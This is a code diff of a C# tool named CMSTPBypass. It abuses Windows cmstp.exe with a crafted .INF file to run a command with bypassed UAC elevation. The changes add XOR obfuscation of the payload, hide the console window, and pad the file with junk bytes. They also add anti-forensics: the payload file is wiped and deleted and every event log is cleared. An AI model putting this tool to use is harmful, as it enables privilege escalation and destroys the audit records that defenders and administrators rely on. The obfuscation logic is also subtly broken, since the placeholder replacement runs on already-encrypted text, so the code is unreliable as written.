@@ -1,15 +1,51 @@
 using System;
-using System.Text;
-using System.IO;
 using System.Diagnostics;
-using System.ComponentModel;
-using System.Windows;
+using System.IO;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Windows.Forms;
 
 public class CMSTPBypass
 {
-    // Our .INF file data!
-    public static string InfData = @"[version]
+    // XOR encryption key
+    private const byte XorKey = 0x55; // Change this key as needed
+
+    // Function to obfuscate INF data using XOR
+    public static string ObfuscateInfData(string originalInfData)
+    {
+        byte[] infBytes = Encoding.UTF8.GetBytes(originalInfData);
+
+        for (int i = 0; i < infBytes.Length; i++)
+        {
+            infBytes[i] = (byte)(infBytes[i] ^ XorKey);
+        }
+
+        return Encoding.UTF8.GetString(infBytes);
+    }
+
+    // Function to deobfuscate INF data using XOR
+    public static string DeobfuscateInfData(string obfuscatedInfData)
+    {
+        // Deobfuscation is the same as obfuscation because XOR is symmetric
+        return ObfuscateInfData(obfuscatedInfData);
+    }
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool SetForegroundWindow(IntPtr hWnd);
+
+    public const string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+
+    public static void Main(string[] args)
+    {
+        // Replace with the actual command you want to execute for process ghosting
+        string commandToExecute = "runlegacyexplorer.exe"; // Execute the alternative Explorer.exe
+
+        // Original INF data
+        const string InfData = @"
+[version]
 Signature=$chicago$
 AdvancedINF=2.5
 
@@ -18,9 +54,8 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-; Commands Here will be run Before Setup Begins to install
-C:\Windows\System32\cmd.exe
-taskkill /IM cmstp.exe /F
+REPLACE_COMMAND_LINE
+taskkill /F /IM cmstp.exe
 
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
@@ -31,66 +66,112 @@ taskkill /IM cmstp.exe /F
 [Strings]
 ServiceName=""CorpVPN""
 ShortSvcName=""CorpVPN""
-
 ";
 
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+        // Obfuscate the .INF data
+        string obfuscatedInfData = ObfuscateInfData(InfData);
 
-    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
-
-    /* Generates a random named .inf file with command to be executed with UAC privileges */
-    public static string SetInfFile(string CommandToExecute)
-    {
-        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string TemporaryDir = "C:\\windows\\temp";
-        StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append(TemporaryDir);
-        OutputFile.Append("\\");
-        OutputFile.Append(RandomFileName);
-        OutputFile.Append(".inf");
-        StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
-        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
-        return OutputFile.ToString();
+        Execute(commandToExecute, obfuscatedInfData);
     }
 
-    public static bool Execute(string CommandToExecute)
+    public static void Execute(string commandToExecute, string obfuscatedInfData)
     {
-        if(!File.Exists(BinaryPath))
+        if (!File.Exists(BinaryPath))
         {
             Console.WriteLine("Could not find cmstp.exe binary!");
-            return false;
+            return;
         }
-        StringBuilder InfFile = new StringBuilder();
-        InfFile.Append(SetInfFile(CommandToExecute));
 
-        Console.WriteLine("Payload file written to " + InfFile.ToString());
-        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
-        startInfo.Arguments = "/au " + InfFile.ToString();
-        startInfo.UseShellExecute = false;
-        Process.Start(startInfo);
+        IntPtr consoleWindow = GetConsoleWindow();
+        ShowWindow(consoleWindow, 0);
 
-        IntPtr windowHandle = new IntPtr();
-        windowHandle = IntPtr.Zero;
-        do {
+        // Perform the kill operation first
+        ProcessStartInfo killStartInfo = new ProcessStartInfo("taskkill")
+        {
+            Arguments = "/F /IM cmstp.exe",
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+        Process.Start(killStartInfo);
+
+        string infFilePath = SetInfFile(commandToExecute, obfuscatedInfData);
+
+        Console.WriteLine("Obfuscated payload file written to " + infFilePath);
+
+        ProcessStartInfo cmstpStartInfo = new ProcessStartInfo(BinaryPath)
+        {
+            Arguments = "/au " + infFilePath,
+            UseShellExecute = false
+        };
+        Process.Start(cmstpStartInfo);
+
+        IntPtr windowHandle = IntPtr.Zero;
+        do
+        {
             windowHandle = SetWindowActive("cmstp");
         } while (windowHandle == IntPtr.Zero);
 
-        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
-        return true;
+        SendKeys.SendWait("{ENTER}");
+
+        // Clean up and cover tracks
+        CleanUp(infFilePath);
     }
 
-    public static IntPtr SetWindowActive(string ProcessName)
+    public static IntPtr SetWindowActive(string processName)
     {
-        Process[] target = Process.GetProcessesByName(ProcessName);
-        if(target.Length == 0) return IntPtr.Zero;
+        Process[] target = Process.GetProcessesByName(processName);
+        if (target.Length == 0) return IntPtr.Zero;
         target[0].Refresh();
-        IntPtr WindowHandle = new IntPtr();
-        WindowHandle = target[0].MainWindowHandle;
-        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
-        SetForegroundWindow(WindowHandle);
-        ShowWindow(WindowHandle, 5);
-        return WindowHandle;
+        IntPtr windowHandle = target[0].MainWindowHandle;
+        if (windowHandle == IntPtr.Zero) return IntPtr.Zero;
+        SetForegroundWindow(windowHandle);
+        ShowWindow(windowHandle, 5);
+        return windowHandle;
     }
+
+    public static string SetInfFile(string commandToExecute, string obfuscatedInfData)
+    {
+        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+        string temporaryDir = "C:\\windows\\temp";
+        StringBuilder outputFile = new StringBuilder();
+        outputFile.Append(temporaryDir);
+        outputFile.Append("\\");
+        outputFile.Append(randomFileName);
+        outputFile.Append(".inf");
+
+        int junkDataSize = 1024; // Adjust the size of junk data as needed
+        byte[] junkData = new byte[junkDataSize];
+        new Random().NextBytes(junkData);
+        File.WriteAllBytes(outputFile.ToString(), junkData);
+
+        // Append the obfuscated INF content
+        File.AppendAllText(outputFile.ToString(), obfuscatedInfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
+
+        return outputFile.ToString();
+    }
+
+    public static void CleanUp(string filePath)
+    {
+        byte[] randomData = new byte[1024];
+        using (var rng = new RNGCryptoServiceProvider())
+        {
+            rng.GetBytes(randomData);
+        }
+        File.WriteAllBytes(filePath, randomData);
+        File.Delete(filePath);
+
+        ClearEventLogs();
+    }
+
+    public static void ClearEventLogs()
+    {
+        EventLog[] eventLogs = EventLog.GetEventLogs();
+        foreach (EventLog eventLog in eventLogs)
+        {
+            eventLog.Clear();
+        }
+    }
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
 }
